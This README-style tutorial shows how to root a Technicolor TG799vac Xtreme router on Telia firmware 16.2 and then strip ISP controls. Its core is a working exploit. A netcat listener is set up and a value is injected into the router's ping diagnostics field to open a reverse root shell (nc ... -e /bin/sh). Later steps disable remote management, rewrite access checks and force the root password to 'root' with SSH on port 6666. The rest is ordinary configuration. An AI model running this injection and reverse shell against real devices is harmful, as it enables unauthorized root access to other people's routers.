![Screenshot](/files/tg799vac-xtreme.gif)

# README

   Telia users with this router model can finally unlock the router and get more features added by hacking the firmware due to an exploit missed by Technicolor developers, this hack works for all 
internet providers worldwide
   that deliver this router aslong you are using the same version as in this tutorial, Jade (16.2). Technicolor has fixed the exploit in version 17.* and above. Telia still is using version 16.2 as 
default so hurry up before it is 
to
   late since the router upgrading itself otherwise. In this wiki i will show how you can turn this auto-upgrade off.

   Please note that if you rent your router from your carrier, you will be liable for repayment if you bricking the device. This is stated in the agreement you have with your carrier, atleast 
customers of Telia has done an 
   agreement if you chosed to get the router along with the order of the internet subscription. Please check this out first if you do not want to risk paying compensation for a bricked device because 
there is always a risk of 
   hacking a firmware. If you follow my guide then everything should be fine, I will not take any responsibility if you bricking your device in any way at all!!!! All users that following this wiki 
is hacking their 
   device at their own risk and they have been well informed of the risks it CAN causes to hack the firmware!!

   Required for this tutorial:

   Of course a Thomson TG799vac-Xtreme router with a firmware that is using version 16.2.

   Netcat wich is a computer networking utility for reading from and writing to network connections using TCP or UDP.
   Netcat is available for Linux and Windows, for android use termux wich providing netcat. For osx/ios i have no idea what is available because I do not care. ;)

   With all that said let's start with the funny part.

# HOWTO

#### Set up a netcat listener on your machine, and adjust any firewall rules to allow an inbound connection:

    nc -lvvp [machine_port]

 ![Screenshot](files/tg799vac-xtreme-1.png)

#### Go to the ping/traceroute diagnostics page in the gateway’s web management, and enter the following:

    :::::::`nc [machine_IP] [machine_port] -e /bin/sh`

## Here i providing a picture aswell: 

![Screenshot](files/tg799vac-xtreme-2.png)

## You should see it like this now:

![Screenshot](files/tg799vac-xtreme-3.png)

### Set your password and then copy / paste:

    uci add_list web.assistancemodal.roles='admin' 
    uci add_list web.usermgrmodal.roles='admin'
    uci add_list web.todmodal.roles='admin'
    uci add_list web.iproutesmodal.roles='admin'
    uci add_list web.cwmpconf.roles='admin'
    uci add_list web.relaysetupmodal.roles='admin'
    uci add_list web.xdsllowmodal.roles='admin'
    uci add_list web.natalghelper.roles='admin'
    uci add_list web.mmpbxglobalmodal.roles='admin' 
    uci add_list web.mmpbxprofilemodal.roles='admin' 
#### OBS!! THIS IS A BACKDOOR > Please go whois the ip to witness it yourself
   So who have access to this machines running on this ip? Of course i asked, 
   and Telia told me in a mail that **ALL** people who works for Telia Support!! **As if we can know if this is abused?**
    
    sed -i s/'131.116.22.242'/'xx.xx.xx.xx'/g /etc/config/dropbear 
#### OBS!! THIS IS A BACKDOOR > Please go whois the ip to witness it yourself 
   This backdoor is for **ALL** people who works for Technicolor Technologies in Belgium!! **As if we can know if this is abused?**

    sed -i s/'82.146.125.0'/'xx.xx.xx.xx'/g /etc/config/dropbear 

    sed -i '1,18 s/^/#/' /etc/config/dropbear
    sed -i '20s/off/on/' /etc/config/dropbear 
    sed -i '21s/off/on/' /etc/config/dropbear
    sed -i '24s/0/1/' /etc/config/dropbear
    sed -i '25s/0/1/' /etc/config/dropbear
    /etc/init.d/nginx restart
    
### ^ Gave you 10 new settings in web interface
#### Please go and witness it on http://dlsdevice.lan 
   Let me provide the default view to see the difference before and after we run these commands
   since I know that there are people who are paranoid for changes due to root. ;)
   The firmware has been **extremely** downgraded to the worse for us consumers.

### Default settings for Telia web-interface looks like this:
![Screenshot](files/tg799vac-xtreme-4.png)

### This is how it looks after we run these commands above:
![Screenshot](files/tg799vac-xtreme-5.png)

### Now you can continue to copy and paste to set some important change for our privacy.

    uci set dropbear.lan.enable='1'
    uci set dropbear.lan.PasswordAuth=on
    uci set dropbear.lan.RootPasswordAuth=on
    uci add_list web.tvoicesipconfig.roles=admin
    uci add_list web.tvoicecontacts.roles=admin
    uci add_list web.tvoicecalllog.roles=admin
    uci add_list web.tvoicecapability.roles=admin
    uci add_list web.parentalblock.roles=admin
    uci add_list web.ruleset_main.rules=mmpbxinoutgoingmapmodal
    uci set web.mmpbxinoutgoingmapmodal=rule
    uci set web.mmpbxinoutgoingmapmodal.target='/modals/mmpbx-inoutgoingmap-modal.lp'
    uci add_list web.mmpbxinoutgoingmapmodal.roles=admin
    uci add_list web.ruleset_main.rules=mmpbxstatisticsmodal
    uci set web.mmpbxstatisticsmodal=rule
    uci set web.mmpbxstatisticsmodal.target='/modals/mmpbx-statistics-modal.lp'
    uci add_list web.mmpbxstatisticsmodal.roles=admin
    uci set cwmpd.cwmpd_config.state=0
    uci set cwmpd.cwmpd_config.upgradesmanaged=0
    uci set cwmpd.cwmpd_config.periodicinform_enable=0
    uci set cwmpd.cwmpd_config.acs_pass='0'
    uci set cwmpd.cwmpd_config.acs_user='0'
    uci set cwmpd.cwmpd_config.acs_url='invalid'
    uci set wifi_doctor_agent.config.enabled=0
    uci add_list web.ruleset_main.rules=cwmpconfmodal
    uci set web.cwmpconfmodal=rule
    uci set web.cwmpconfmodal.target='/modals/cwmpconf-modal.lp'
    uci add_list web.cwmpconfmodal.roles=admin
    uci set hotspotd.main.ipv4=0
    uci set hotspotd.main.enable=false
    uci set hotspotd.main.deploy=false
    uci set hotspotd.TLS2G.enable=0
    uci set hotspotd.FON2G.enable=0
    uci add_list web.ruleset_main.rules=iproutesmodal
    uci set web.iproutesmodal=rule
    uci set web.iproutesmodal.target='/modals/iproutes-modal.lp'
    uci add_list web.iproutesmodal.roles=admin
    uci add_list web.ruleset_main.rules=systemmodal
    uci set web.systemmodal=rule
    uci set web.systemmodal.target='/modals/system-modal.lp'
    uci add_list web.systemmodal.roles=admin
    uci add_list web.ruleset_main.rules=relaymodal
    uci set web.relaymodal=rule
    uci set web.relaymodal.target='/modals/relay-modal.lp'
    uci add_list web.relaymodal.roles=admin
    uci add_list web.ruleset_main.rules=natalghelpermodal
    uci set web.natalghelpermodal=rule
    uci set web.natalghelpermodal.target='/modals/nat-alg-helper-modal.lp'
    uci add_list web.natalghelpermodal.roles=admin
    uci set tls-vsparc.Config.Enabled='0'
    uci set tls-vsparc.Passive.PassiveEnabled='0'
    uci add_list web.ruleset_main.rules=diagnosticstcpdumpmodal
    uci set web.diagnosticstcpdumpmodal=rule
    uci set web.diagnosticstcpdumpmodal.target='/modals/diagnostics-tcpdump-modal.lp'
    uci add_list web.diagnosticstcpdumpmodal.roles=admin
    uci set system.config.export_plaintext='1'
    uci set system.config.export_unsigned='1'
    uci set system.config.import_plaintext='1'
    uci set system.config.import_unsigned='1'
    sed -e 's/session:hasAccess("\/modals\/diagnostics-network-modal.lp")/session:hasAccess("\/modals\/diagnostics-network-modal.lp") and \n session:hasAccess("\/modals\/diagnostics-tcpdump-modal.lp")/' -i /www/cards/009_diagnostics.lp
    sed -e 's^alt="network"></div></td></tr>\\^alt="network"></div></td>\\\n <td><div data-toggle="modal" data-remote="modals/diagnostics-tcpdump-modal.lp" data-id="diagnostics-tcpdump-modal"><img href="#" rel="tooltip" data-original-title="TCPDUMP" src="/img/network_sans-32.png" alt="network"></div></td></tr>\\^' -i /www/cards/009_diagnostics.lp
    sed -e 's/{"logviewer-modal.lp", T"Log viewer"},/{"logviewer-modal.lp", T"Log viewer"},\n {"diagnostics-tcpdump modal.lp", T"tcpdump"},\n/' -i /www/snippets/tabs-diagnostics.lp
    sed -e 's/getrole()=="guest"/getrole()=="admin"/' -i /www/snippets/tabs-voice.lp
    sed -e 's/{"mmpbx-sipdevice-modal.lp", T"Sip Device"},/{"mmpbx-sipdevice-modal.lp", T"Sip Device"},\n{"mmpbx-inoutgoingmap-modal.lp", T"In-Out Mapping"},\n{"mmpbx-statistics-modal.lp", T"Statistics"},/' -i /www/snippets/tabs-voice.lp
    sed -e 's/if currentuserrole == "guest" /if currentuserrole == "admin" /' -i /www/docroot/modals/gateway-modal.lp
    echo > /etc/rc.local
    /etc/init.d/nginx restart;
    /etc/init.d/cwmpd disable;
    /etc/init.d/cwmpdboot disable;
    /etc/init.d/wifi-doctor-agent disable;
    /etc/init.d/hotspotd disable;
    /etc/init.d/tls-vsparc disable; 
    killall -9 hotspotd cwmpd cwmpdboot watchdog-tch wifi-doctor-agent tls-vsparc;
    /etc/init.d/dropbear start
    uci commit

#### Serial Console

    More info will be addded here later, had no time to write this part yet.
    /etc/initd
    #ttyS0::askfirst:/bin/login
    echo > /etc/dropbear/authorized_keys

#### Speeding up VDSL sync times

    uci del_list xdsl.dsl0.profile='8a'
    uci del_list xdsl.dsl0.profile='8b'
    uci del_list xdsl.dsl0.profile='8c'
    uci del_list xdsl.dsl0.profile='8d'
    uci del_list xdsl.dsl0.profile='12a'
    uci del_list xdsl.dsl0.profile='12b'
    uci del_list xdsl.dsl0.multimode='gdmt'
    uci del_list xdsl.dsl0.multimode='adsl2annexm'
    uci del_list xdsl.dsl0.multimode='adsl2plus'
    uci commit
    reboot

### If you wish to add the selections to the web interface to play with later, you can run the following:

    uci add_list web.ruleset_main.rules=xdsllowmodal
    uci set web.xdsllowmodal=rule
    uci set web.xdsllowmodal.target='/modals/xdsl-low-modal.lp'
    uci add_list web.xdsllowmodal.roles='admin'
    uci commit

#### Add/Delete ADSL profiles and modes

    uci del_list xdsl.dsl0.profile='8a'
    uci del_list xdsl.dsl0.profile='8b'
    uci del_list xdsl.dsl0.profile='8c'
    uci del_list xdsl.dsl0.profile='8d'
    uci del_list xdsl.dsl0.profile='12a'
    uci del_list xdsl.dsl0.profile='12b'
    uci del_list xdsl.dsl0.multimode='gdmt'
    uci del_list xdsl.dsl0.multimode='adsl2annexm'
    uci del_list xdsl.dsl0.multimode='adsl2plus'
    uci commit
    
#### Changing max sync speed
    uci set xdsl.dsl0.maxaggrdatarate='160000'
    uci set xdsl.dsl0.maxdsdatarate='110000'
    uci set xdsl.dsl0.maxusdatarate='40000'
    uci commit xdsl
    reboot
   
##### Enable/Disable WIFI

    uci set wireless.radio_2G.state='0'
    uci set wireless.radio_5G.state='0'
    uci commit

    /etc/init.d/hostapd stop
    /etc/init.d/hostapd disable

##### Enable/Disable ODHCP services

    /etc/init.d/odhcpd stop
    /etc/init.d/odhcpd disable

##### Enable/Disable dnsmasq as all interfaces are ignored now
 
    uci show dhcp.lan.ignore='1'
    
    /etc/init.d/dnsmasq stop
    /etc/init.d/dnsmasq disable

##### Enable/Disable network time server

    uci set system.ntp.enable_server='0'
    uci commit

    /etc/init.d/sysntpd restart

##### Enable/Disable IGMP Proxy

    /etc/init.d/igmpproxy stop
    /etc/init.d/igmpproxy disable

#### Using bridge mode with a dedicated PPPoE ethernet port
  
    uci set network.lan.dns='8.8.8.8'
    uci set network.lan.gateway='10.0.0.254'
    uci set mmpbxrvsipnet.sip_net.interface='lan'
    uci set mmpbxrvsipnet.sip_net.interface6='lan6'
    uci commit

#### You can check the current running dns with

    cat /etc/resolv.conf
    
#### Enable web interface features in Bridge Mode
    If you have the modem in bridge mode, the web interface is gutted compared to in routed mode.
    Edit /www/lua/cards_limiter.lua and change the following function to:
   
    'function M.card_limited(info, cardname)
     return false
     if info.bridged then
     return not bridge_limit_list[cardname]
     end
     return false
     end
     /etc/init.d/nginx restart
     
#### Disable WWAN support (mobiled)

     uci set mobiled.globals.enabled='0'
     uci set mobiled.device_defaults.enabled='0'
     uci commit
     /etc/init.d/mobiled stop
     /etc/init.d/mobiled disable
     
#### Disable Content Sharing (Samba / DNLA)

     uci set samba.samba.enabled='0'
     /etc/init.d/samba stop
     /etc/init.d/samba disable
     /etc/init.d/samba-nmbd stop
     /etc/init.d/samba-nmbd disable
     uci set dlnad.config.enabled='0'
     uci commit
     
     /etc/init.d/dlnad stop
     /etc/init.d/dlnad disable
     
#### Disable Monitor Of Traffic

**Random Example Preview**

![Screenshot](files/tg799vac-xtreme-10.gif)

     uci set system.@trafficmon[0].interface=''
     uci set system.@trafficmon[0].minute=''
     uci set system.@trafficmon[1].interface=''
     uci set system.@trafficmon[1].minute=''
     uci set system.@trafficmon[2].interface=''
     uci set system.@trafficmon[2].minute=''
     uci set system.@trafficmon[3]=trafficmon
     uci set system.@trafficmon[3].interface=''
     uci set system.@trafficmon[3].minute=''



#### Disable Time of Day ACL rules

     uci set tod.global.enabled='0'
     uci commit

     /etc/init.d/tod stop
     /etc/init.d/tod disable
     
# _Root your TG799 Router_

    inactive_bank="$(cat /proc/banktable/inactive)"  # bank_1 or bank_2
    inactive_overlay="/overlay/$inactive_bank"
    rm -rf "$inactive_overlay"
    mkdir -p "$inactive_overlay/etc"
    chmod 755 "$inactive_overlay"
    chmod 775 "$inactive_overlay/etc"
    echo "echo root:root | chpasswd" > "$inactive_overlay/etc/rc.local"
    echo "dropbear -p 6666 &" >> "$inactive_overlay/etc/rc.local"
    chmod +x "$inactive_overlay/etc/rc.local"

    echo "$inactive_bank" > /proc/banktable/active
    sync
    reboot

### Setup

1. Disconnect any form of WAN connection from your modem, such as the xDSL
   line or Ethernet connection on the WAN port.  This is super important in
   ensuring that the modem's firmware doesn't go auto-updating.
   
1. Have a computer or device on hand where you can set up the following tools.
   If you don't have Python (with tkinter support) or Git installed, you'll
   need to install them both or figure out a plan to proceed manually.
   
   Your device will need to have a GUI (eg not be a headless server) 
   as well for at least when tkinter gets used for the `autoflashgui` tool.
   Everything else should work headless, if you're so inclined.
   
1. Get the latest version of these scripts; you'll need them for later:

   ```sh
   git clone https://github.com/davidjb/technicolor-tg799vac-hacks.git
   ```
   
   Make sure you do this on your computer/device rather than on your modem.

1. Get the latest version of `autoflashgui`, the firmware flashing and root
   tool:

   ```sh
   git clone https://github.com/mswhirl/autoflashgui.git
   ```
   
   Again, make sure this is on your computer/device and not your modem.

1. [Get the
   firmware](https://drive.google.com/drive/folders/1n9IAp9qUauTT9eMLf3oYQMbodFEGFHyL)
   for your TG799vac device.  You'll need the two firmwares
   as indicated below.  For completeness, here are the SHA-256 hashes:

   ```
   38b41546133b2e979befce8e824654289aa237446fc4118444f271423c35e3fa vant-f_CRF687-16.3.7567-660-RG.rbi
   0c9bf5e739600ceae61362eebc6ee271783ff85e5d60e3c3076f98bd37648d02 vant-f_CRF683-17.2.188-820-RA.rbi
   ```

1. Setup the `autoflashgui` tool:

   ```sh
   cd autoflashgui
   virtualenv .
   source ./bin/activate
   pip install robobrowser==0.5.3
   ```

### Flash and get root

If your modem happens to be running a newer firmware version (such as an
Over-The-Air [OTA] upgrade that happened) or you happen to get locked out for
any reason, try a factory reset with the modem physically disconnected from
the Internet.

To factory reset, get a paperclip and hold down the reset button for 15
seconds.  Release the button and wait a few moments -- the modem will restore,
all the LEDs will flash and the modem will reset.

1. Start the tool:

   ```sh
   python autoflashgui.py
   ```

1. Flash `vant-f_CRF683-17.2.188-820-RA.rbi` with the tool.  This will fail to
   root (console will continually keep trying to connect and fail; this is
   okay).  In my second attempt with a modem starting from firmware 15.3, this
   actually appeared to succeed and send comamnds to the newly-booted 17.2
   firmware, but the SSH port wasn't open.


1. Kill the tool in the console with `Control-C`.

1. Flash `vant-f_CRF687-16.3.7567-660-RG.rbi` with the tool. This will take a
   little while as it authenticates, then flashes, waits for a reboot of the
   modem and then eventually proceeds to perform command injection on the
   modem.

   If at this point the modem is not allowing SSH connections, then you may
   need to reflash the version of 17.2 now when on what should be a rooted
   version of 16.3.  This is something I observed when the firmware first
   started out at 17.2 on one specific device, so I suspect the flashing of
   17.2 when already on some version of 17.2 meant the flash didn't take or
   apply correctly.  In any case, reflashing 17.2 at this point (and then
   reflashing 16.3 *again*...) solved this for me.  Once you do get an SSH
   session available, you can continue on.

1. When done, SSH to the modem as `root` and change the password
   **immediately**:

   ```sh
   ssh root@10.0.0.138
   # Now on the modem...
   passwd
   ```

1. Remove the pre-existing `/etc/dropbear/authorized_keys` file and ideally
   replace it with your own.  This is a fun little backdoor the devs left
   there, judging by the comment `TCH Debug` on one of the keys.

1. Reboot the modem to complete disabling the services that were killed during
   the rooting process with `autoflashgui.py`

### Root and switch to new firmware

By this point, your modem is now running `16.3` firmware and has the `17.2`
firmware on board in its inactive, secondary flash partition.  We'll now
switch over to the latter firmware after injecting the ability to give
ourselves root.

1. Re-connect to the modem's wifi network and SSH back in to run the contents
   of `01-root-and-switch-fw.sh`:

   ```sh
   ssh root@10.0.0.138 'sh' < ./01-root-and-switch-fw.sh
   ```

   _There are more secure ways to run the file, like actually inspecting the
   contents.  It's up to you how safe you'd like to play it and mostly how
   much you trust me / GitHub._



     
#### Tired on passwords and want to use dropbear key for login instead, then do following:

#### Generate the Key Pair on your pc (not router):

     ssh-keygen -t dsa

#### Next copy the public key with SCP to OpenWrt:
   
    scp ~/.ssh/id_dsa.pub root@192.168.1.1:/tmp

#### Now connect to your router.
#### Add the public key to the authorized_keys from ~/.ssh/id_dsa.pub

     cd /etc/dropbear
     cat /tmp/id_*.pub >> authorized_keys
     chmod 0600 authorized_keys
     exit
  
#### Disconnect from your router and type following on your pc:
   
     ssh root@192.168.1.1 "tee -a /etc/dropbear/authorized_keys" < ~/.ssh/id_rsa.pub
     
#### Now connect:
   
     ssh root@192.168.1.1
   
   ![Screenshot](files/tg799vac-xtreme-6.png)


# Want get rid of the default layout?

   Then we has to edit the CSS files.
   I wont go though every color since its a huge job and really boring since telia 
   using like 10 different shades on their purple color!! :-/
   But as example, to change background of web interface you can copy and paste in shell:

     sed -i s/'eeeeee'/'000000'/g gw.css; sed -i s/'eeeeee'/'000000'/g lte-doctor.css; 
     sed -i s/'eeeeee'/'000000'/g responsive.css;  sed -i s/'eeeeee'/'000000'/g mobiled.css; 
     sed -i s/'eeeeee'/'000000'/g chosen.css

   As you can see on the pictures below the background has been changed:
   If you want to use 'theme wuseman' on your technicolor tg799-vac xtreme
   router then copy & paste my commands below the previews: (or download my css files and scp them over to router)

#### Login page:
![Screenshot](files/tg799vac-xtreme-7.png)

#### Once you've logged in, it looks like this:
![Screenshot](files/tg799vac-xtreme-8.png)

#### This is my personal theme from a mobile device:
![Screenshot](files/tg799vac-xtreme-9.png)

#### This is my personal theme from a pc device:
![Screenshot](files/tg799vac-xtreme-10.png)

#### A failed login attempt as user 'telia' or 'assist' (ofc, all usernames will be logged) will be reported from now since they dont have permissions to login if i didnt requested support from them:
![Screenshot](files/tg799vac-xtreme-11.png)

#### We can see failed login attempts in the system log for both telnet, ssh and the web:
![Screenshot](files/tg799vac-xtreme-12.png)

#### To get colors as above, paste following in router shell: 
    sed -i s/'333333'/'e6e6e6'/g gw.css; sed -i s/'333333'/'e6e6e6'/g responsive.css; sed -i s/'333333'/'e6e6e6'/g lte-doctor.css; 
    sed -i s/'333333'/'e6e6e6'/g chosen.css; sed -i s/'333333'/'e6e6e6'/g mobiled.css; sed -i s/'990ae3'/'55aa7f'/g gw.css; 
    sed -i s/'990ae3'/'55aa7f'/g responsive.css; sed -i s/'990ae3'/'55aa7f'/g chosen.css; sed -i s/'990ae3'/'55aa7f'/g mobiled.css; 
    sed -i s/'eeeeee'/'2f5e45'/g gw.css; sed -i s/'eeeeee'/'2f5e45'/g responsive.css; sed -i s/'eeeeee'/'2f5e45'/g lte-doctor.css; 
    sed -i s/'eeeeee'/'2f5e45'/g chosen.css; sed -i s/'eeeeee'/'2f5e45'/g mobiled.css; sed -i s/'a70af5'/'55aa7f'/g gw.css; 
    sed -i s/'990ae3'/'00aa00'/g gw.css; sed -i s/'45004e'/'005100'/g gw.css; sed -i s/'4d234d'/'003e00'/g gw.css; 
    sed -i s/'purple'/'green'/g gw.css; sed -i s/'a70af5'/'55aa7f'/g responsive.css; sed -i s/'990ae3'/'00aa00'/g responsive.css; 
    sed -i s/'45004e'/'005100'/g responsive.css; sed -i s/'4d234d'/'003e00'/g responsive.css; 
    sed -i s/'purple'/'green'/g responsive.css; sed -i s/'purple'/'green'/g gw.css; sed -i s/'a70af5'/'55aa7f'/g lte-doctor.css; 
    sed -i s/'990ae3'/'00aa00'/g lte-doctor.css; sed -i s/'45004e'/'005100'/g lte-doctor.css; sed -i s/'4d234d'/'003e00'/g lte-doctor.css; 
    sed -i s/'purple'/'green'/g gw.css; sed -i s/'a70af5'/'55aa7f'/g chosen.css; sed -i s/'990ae3'/'00aa00'/g chosen.css;
    sed -i s/'45004e'/'005100'/g chosen.css; sed -i s/'purple'/'green'/g lte-doctor.css; sed -i s/'4d234d'/'003e00'/g chosen.css; 
    sed -i s/'purple'/'green'/g chosen.css; sed -i s/'a70af5'/'55aa7f'/g mobiled.css; sed -i s/'990ae3'/'00aa00'/g mobiled.css; 
    sed -i s/'45004e'/'005100'/g mobiled.css; sed -i s/'4d234d'/'003e00'/g mobiled.css; sed -i s/'purple'/'green'/g mobiled.css; 
    sed -i s/'6dc56d'/'62ff00'/g gw.css; sed -i s/'6dc56d'/'62ff00'/g responsive.css; sed -i s/'6dc56d'/'62ff00'/g lte-doctor.css; 
    sed -i s/'6dc56d'/'62ff00'/g chosen.css; sed -i s/'6dc56d'/'62ff00'/g mobiled.css; sed -i s/'999'/'66ffe1'/g responsive.css;
    sed -i s/'f5f5f5'/'183124'/g gw.css; sed -i s/'f5f5f5'/'183124'/g responsive.css; sed -i s/'f5f5f5'/'183124'/g lte-doctor.css; 
    sed -i s/'f5f5f5'/'183124'/g chosen.css; sed -i s/'f5f5f5'/'183124'/g mobiled.css; sed -i s/'ffffff'/'ffaa00'/g mobiled.css; 
    sed -i s/'aaaaaa'/'87ff66'/g gw.css; sed -i s/'aaaaaa'/'87ff66'/g responsive.css; sed -i s/'aaaaaa'/'87ff66'/g lte-doctor.css; 
    sed -i s/'aaaaaa'/'87ff66'/g chosen.css; sed -i s/'aaaaaa'/'87ff66'/g mobiled.css; sed -i s/'ffffff'/'ffaa00'/g gw.css; 
    sed -i s/'ffffff'/'ffaa00'/g responsive.css; sed -i s/'ffffff'/'ffaa00'/g lte-doctor.css; sed -i s/'ffffff'/'ffaa00'/g chosen.css; 
    sed -i s/'ffffff'/'ffaa00'/g gw.css; sed -i s/'ffffff'/'ffaa00'/g responsive.css; sed -i s/'ffffff'/'ffaa00'/g lte-doctor.css; 
    sed -i s/'ffffff'/'ffaa00'/g chosen.css; sed -i s/'ffffff'/'ffaa00'/g mobiled.css; sed -i s/'999'/'66ffe1'/g gw.css; 
    sed -i s/'999'/'66ffe1'/g lte-doctor.css; sed -i s/'999'/'66ffe1'/g mobiled.css; sed -i s/'ccc'/'66ffe1'/g gw.css;
    sed -i s/'ccc'/'66ffe1'/g responsive.css; sed -i s/'ccc'/'66ffe1'/g lte-doctor.css; sed -i s/'ccc'/'66ffe1'/g chosen.css; 
    sed -i s/'ccc'/'66ffe1'/g mobiled.css; sed -i s/'ccc'/'66ffe1'/g gw.css; sed -i s/'ccc'/'66ffe1'/g responsive.css; 
    sed -i s/'ccc'/'66ffe1'/g lte-doctor.css; sed -i s/'ccc'/'66ffe1'/g chosen.css; sed -i s/'ccc'/'66ffe1'/g mobiled.css; 
    sed -i s/'d9d9d9'/'222222'/g gw.css; sed -i s/'d9d9d9'/'222222'/g responsive.css; sed -i s/'0088cc'/'#5ebe8d'/g gw.css;
    sed -i s/'d9d9d9'/'222222'/g lte-doctor.css; sed -i s/'d9d9d9'/'222222'/g chosen.css; sed -i s/'0088cc'/'#5ebe8d'/g responsive.css; 
    sed -i s/'0088cc'/'#5ebe8d'/g lte-doctor.css; sed -i s/'0088cc'/'#5ebe8d'/g chosen.css

## Todo in upcomming updates:

     Add how-to downgrade/upgrade firmware
     Add how-to get access via serial port and how-to short circuit compononents to get rid of read only rom
     Add how-to it is possible to get openvpn running
     Add how-to get rid of OPKG and fix JFFS2

#### 'Bah wuseman, i am already an pro expert, provide something useful for me?'
     I will do asap i got time. I will add a how-to for LUCI WEBGUI and you will 
     gain FULL access to your router for real!! (requires more then 8mb flash):

### Have fun and be careful with other settings not provided by me! ;)


# CONTACT

     If you have problems, questions, ideas or suggestions please contact
     us by posting to info@sendit.nu

# WEB SITE

     Visit our homepage for the latest info and updated tools

     https://sendit.nu & https://github.com/wuseman/

### END!






